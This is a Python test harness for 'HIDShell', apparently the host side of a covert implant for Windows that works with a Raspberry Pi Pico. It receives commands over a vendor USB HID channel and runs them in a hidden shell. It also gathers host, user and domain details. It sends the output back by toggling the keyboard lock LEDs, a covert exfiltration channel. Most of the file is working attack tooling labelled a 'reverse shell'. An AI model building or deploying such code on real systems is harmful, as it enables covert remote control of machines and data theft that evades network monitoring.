"""
HIDShell - test_harness.py (OOB Implant Shell)

Simulates the implant side for local testing.
Run THIS first, then open Thonny to see decoded output.

Flow:
  You type here → command sent via HID → executed locally →
  output sent back via LED toggles → Pico decodes → Thonny shows it
"""

import ctypes
import ctypes.wintypes
import subprocess
import threading
import time
import sys
import os

try:
    import hid
except ImportError:
    print("\n  \033[91m[!]\033[0m Run: pip install hidapi\n")
    sys.exit(1)

# ─── Configuration ───────────────────────────────────────────────────────────

VENDOR_ID  = 0x239A
PRODUCT_ID = 0x80F4

BIT_DELAY  = 0.03
BYTE_DELAY = 0.008

FRAME_STX = 0x02
FRAME_ETX = 0x03

FLAG_START = 0x01
FLAG_END   = 0x02
FLAG_DATA  = 0x04

CMD_TIMEOUT = 30
MAX_OUTPUT  = 4096

# ─── ANSI ────────────────────────────────────────────────────────────────────

R   = "\033[0m"
DIM = "\033[2m"
BLD = "\033[1m"
RED = "\033[91m"
GRN = "\033[92m"
YLW = "\033[93m"
CYN = "\033[96m"
GRY = "\033[90m"
WHT = "\033[97m"
MAG = "\033[95m"

def cls():
    os.system("cls" if os.name == "nt" else "clear")

def bar(width=50):
    return f"{GRY}{'─' * width}{R}"

def progress_bar(current, total, width=30):
    pct = current / total if total > 0 else 0
    filled = int(width * pct)
    return f"{GRY}[{CYN}{'█' * filled}{'░' * (width - filled)}{GRY}]{R} {pct*100:.0f}%"

# ─── Windows API ─────────────────────────────────────────────────────────────

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

VK_NUMLOCK    = 0x90
VK_CAPSLOCK   = 0x14
VK_SCROLLLOCK = 0x91

KEYEVENTF_EXTENDEDKEY = 0x0001
KEYEVENTF_KEYUP       = 0x0002

def toggle_key(vk_code):
    user32.keybd_event(vk_code, 0x45, KEYEVENTF_EXTENDEDKEY, 0)
    user32.keybd_event(vk_code, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0)

def get_led_state(vk_code):
    return bool(user32.GetKeyState(vk_code) & 1)

# ─── LED Transmitter ─────────────────────────────────────────────────────────

def send_byte_via_leds(byte_val):
    for i in range(7, -1, -1):
        bit = (byte_val >> i) & 1
        if bit:
            toggle_key(VK_NUMLOCK)
        else:
            toggle_key(VK_CAPSLOCK)
        time.sleep(BIT_DELAY)
    toggle_key(VK_SCROLLLOCK)
    time.sleep(BIT_DELAY + BYTE_DELAY)

def send_data_via_leds(data):
    if isinstance(data, str):
        data = data.encode("utf-8", "replace")

    total = len(data) + 2
    sent = 0

    print(f"\n  {YLW}▼ LED TX{R}  {DIM}{len(data)} bytes → Pico decoder{R}")
    print(f"  {progress_bar(0, total)}", end="", flush=True)

    t0 = time.time()
    send_byte_via_leds(FRAME_STX)
    sent += 1
    print(f"\r  {progress_bar(sent, total)}", end="", flush=True)

    for b in data:
        send_byte_via_leds(b)
        sent += 1
        if sent % 3 == 0 or sent == total - 1:
            elapsed = time.time() - t0
            rate = sent / elapsed if elapsed > 0 else 0
            print(f"\r  {progress_bar(sent, total)}  {DIM}{rate:.1f} B/s{R}  ", end="", flush=True)

    send_byte_via_leds(FRAME_ETX)
    sent += 1

    elapsed = time.time() - t0
    rate = len(data) / elapsed if elapsed > 0 else 0
    print(f"\r  {progress_bar(sent, total)}  {GRN}{elapsed:.1f}s @ {rate:.1f} B/s{R}  ")
    print(f"  {DIM}Check Thonny for decoded output{R}")

# ─── HID Command Sender ─────────────────────────────────────────────────────

def send_command_via_hid(device, cmd_str):
    cmd_bytes = cmd_str.encode("utf-8")
    report = bytearray(63)
    report[0] = FLAG_START | FLAG_END | FLAG_DATA
    report[1] = len(cmd_bytes)
    report[2:2 + len(cmd_bytes)] = cmd_bytes
    try:
        device.write(bytes([0x04]) + bytes(report))
        return True
    except Exception:
        return False

# ─── Command Executor ────────────────────────────────────────────────────────

def execute_command(cmd):
    cmd = cmd.strip()
    if cmd == "__PING__":
        return "__PONG__"
    if cmd == "__INFO__":
        info = []
        info.append(f"host: {os.environ.get('COMPUTERNAME', '?')}")
        info.append(f"user: {os.environ.get('USERNAME', '?')}")
        info.append(f"domain: {os.environ.get('USERDOMAIN', '?')}")
        info.append(f"os: {os.environ.get('OS', '?')}")
        info.append(f"arch: {os.environ.get('PROCESSOR_ARCHITECTURE', '?')}")
        info.append(f"pid: {os.getpid()}")
        return "\n".join(info)
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True,
            timeout=CMD_TIMEOUT,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        output = result.stdout
        if result.stderr:
            output += result.stderr
        return output[:MAX_OUTPUT] if output else "(no output)"
    except subprocess.TimeoutExpired:
        return "(timeout)"
    except Exception as e:
        return f"(error: {e})"

# ─── Device Discovery ───────────────────────────────────────────────────────

def find_vendor_hid():
    all_pico = []
    for d in hid.enumerate(VENDOR_ID, PRODUCT_ID):
        all_pico.append(d)
    if not all_pico:
        return None
    for target_up in (0xFF00, 0xFF, 0x00FF):
        for d in all_pico:
            if d['usage_page'] == target_up and d['usage'] == 0x01:
                return d
    for d in all_pico:
        if d['usage_page'] not in (0x01, 0x0C):
            return d
    return None

# ─── Banner ──────────────────────────────────────────────────────────────────

BANNER = f"""
  {RED}  _   _ ___ ____  ____  _          _ _ {R}
  {RED} | | | |_ _|  _ \\/ ___|| |__   ___| | |{R}
  {RED} | |_| || || | | \\___ \\| '_ \\ / _ \\ | |{R}
  {RED} |  _  || || |_| |___) | | | |  __/ | |{R}
  {RED} |_| |_|___|____/|____/|_| |_|\\___|_|_|{R}
  {DIM} covert HID reverse shell // 0dayscyber{R}
  {bar()}
  {DIM} OOB SHELL — open Thonny after this to see output{R}
"""

HELP_TEXT = f"""
  {bar()}
  {BLD}{WHT} COMMANDS{R}
  {bar()}
  {CYN}  ping{R}       {DIM}→{R} keepalive check
  {CYN}  info{R}       {DIM}→{R} system info
  {CYN}  ledtest{R}    {DIM}→{R} send 'HELLO' via LEDs (no exec)
  {CYN}  leds{R}       {DIM}→{R} show current LED states
  {CYN}  speed{R} {GRY}N{R}    {DIM}→{R} set BIT_DELAY in ms
  {CYN}  clear{R}      {DIM}→{R} clear screen
  {CYN}  help{R}       {DIM}→{R} this help
  {CYN}  quit{R}       {DIM}→{R} exit
  {bar()}
  {DIM} Everything else runs as a shell command.{R}
  {DIM} Output goes via LED channel → Pico → Thonny.{R}
  {bar()}
"""

# ─── Main ────────────────────────────────────────────────────────────────────

def main():
    global BIT_DELAY

    cls()
    print(BANNER)

    # ── Scan ─────────────────────────────────────────────────────────
    print(f"  {YLW}*{R} Scanning for Pico...")
    dev_info = find_vendor_hid()

    if not dev_info:
        print(f"  {RED}x{R} No vendor HID found\n")
        print(f"  {DIM}Is Thonny closed? Is the Pico plugged in?{R}")
        print(f"  {DIM}Did boot.py run? (check boot_out.txt){R}\n")
        print(f"  {DIM}All HID devices:{R}")
        for d in hid.enumerate():
            print(f"    {GRY}VID=0x{d['vendor_id']:04X} PID=0x{d['product_id']:04X} "
                  f"UP=0x{d['usage_page']:04X} U=0x{d['usage']:04X} "
                  f"{d.get('product_string', '?')}{R}")
        sys.exit(1)

    # ── Connect ──────────────────────────────────────────────────────
    device = hid.device()
    try:
        device.open_path(dev_info['path'])
        device.set_nonblocking(True)
    except Exception as e:
        print(f"  {RED}x{R} Failed to open: {e}")
        print(f"  {DIM}Try running as Administrator{R}")
        sys.exit(1)

    up = dev_info['usage_page']
    print(f"  {GRN}+{R} Connected {DIM}(UP=0x{up:04X}){R}")

    n = f"{GRN}ON{R}" if get_led_state(VK_NUMLOCK) else f"{GRY}OFF{R}"
    c = f"{GRN}ON{R}" if get_led_state(VK_CAPSLOCK) else f"{GRY}OFF{R}"
    s = f"{GRN}ON{R}" if get_led_state(VK_SCROLLLOCK) else f"{GRY}OFF{R}"
    print(f"  {DIM}LEDs: NUM:{n} {DIM}CAPS:{c} {DIM}SCROLL:{s}{R}")

    print(f"\n  {GRN}Ready.{R} {DIM}Open Thonny now to see decoded output.{R}")
    print(f"  {DIM}Type {CYN}help{DIM} for commands.{R}\n")

    # ── Shell loop ───────────────────────────────────────────────────
    cmd_count = 0
    try:
        while True:
            try:
                cmd = input(f"  {RED}{BLD}hidshell{R} {GRY}>{R} ").strip()
            except EOFError:
                break

            if not cmd:
                continue

            cl = cmd.lower()

            if cl in ("quit", "exit"):
                break

            if cl == "help":
                print(HELP_TEXT)
                continue

            if cl == "clear":
                cls()
                print(BANNER)
                continue

            if cl == "leds":
                n = f"{GRN}ON{R}" if get_led_state(VK_NUMLOCK) else f"{GRY}OFF{R}"
                c = f"{GRN}ON{R}" if get_led_state(VK_CAPSLOCK) else f"{GRY}OFF{R}"
                s = f"{GRN}ON{R}" if get_led_state(VK_SCROLLLOCK) else f"{GRY}OFF{R}"
                print(f"  NUM:{n}  CAPS:{c}  SCROLL:{s}")
                continue

            if cl.startswith("speed"):
                parts = cmd.split()
                if len(parts) == 2:
                    try:
                        ms = int(parts[1])
                        BIT_DELAY = ms / 1000.0
                        print(f"  {GRN}+{R} BIT_DELAY = {ms}ms")
                    except ValueError:
                        print(f"  {RED}x{R} Usage: speed <ms>")
                else:
                    print(f"  {DIM}Current: {BIT_DELAY*1000:.0f}ms{R}")
                continue

            if cl == "ledtest":
                send_data_via_leds("HELLO")
                continue

            # ── Execute round-trip ───────────────────────────────────
            cmd_count += 1
            actual = cmd
            if cl == "ping":
                actual = "__PING__"
            elif cl == "info":
                actual = "__INFO__"

            # 1. Send command via HID
            print(f"\n  {CYN}>{R} {WHT}{actual}{R}")
            if not send_command_via_hid(device, actual):
                print(f"  {RED}x{R} HID send failed")
                continue
            print(f"  {GRN}+{R} {DIM}sent via HID{R}")

            # 2. Execute locally
            output = execute_command(actual)
            print(f"  {GRN}+{R} {DIM}executed ({len(output)} bytes){R}")

            # 3. Send output via LEDs → Pico decodes → Thonny shows
            send_data_via_leds(output)
            print()

    except KeyboardInterrupt:
        print(f"\n\n  {DIM}Interrupted{R}")
    finally:
        device.close()
        print(f"\n  {DIM}{cmd_count} commands | session closed{R}\n")


if __name__ == "__main__":
    main()
